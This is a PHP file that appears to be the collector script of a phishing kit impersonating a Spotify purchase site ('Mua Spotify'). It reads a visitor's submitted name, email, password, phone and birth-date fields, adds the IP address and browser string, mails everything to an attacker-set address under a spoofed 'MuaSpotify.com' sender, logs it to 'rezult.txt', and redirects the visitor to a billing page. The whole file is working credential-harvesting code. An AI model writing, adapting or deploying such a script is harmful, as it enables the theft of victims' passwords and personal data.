<?php
include "to.php";
$Name = $_POST['Name'];
$Email = $_POST['Email'];
$Pass = $_POST['Pass'];
$Phone = $_POST['Phone'];
$Month = $_POST['Month'];
$Nam = $_POST['Nam'];
$Nu = $_POST['Nu'];
$Gay = $_POST['Gay'];
$Note = $_POST['Note'];
$Date = "" . date("d/m/y") . "";
date_default_timezone_set("Asia/Ho_Chi_Minh");
$Time = "Asia/Ho_Chi_Minh " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Thông Tin -------------
Tên: $Name
Email : $Email
Pass : $Pass
Phone : $Phone
Month : $Month
Nam : $Nam
Nu : $Nu
Gay : $Gay
Note : $Note
-------------- IP ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Mua Spotify ---------";
$MAIL_TITLE = "Info ".$IP."";
$MAIL_HEADER = "From: MuaSpotify.com";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("rezult.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=Billing.php'>";exit;

?>
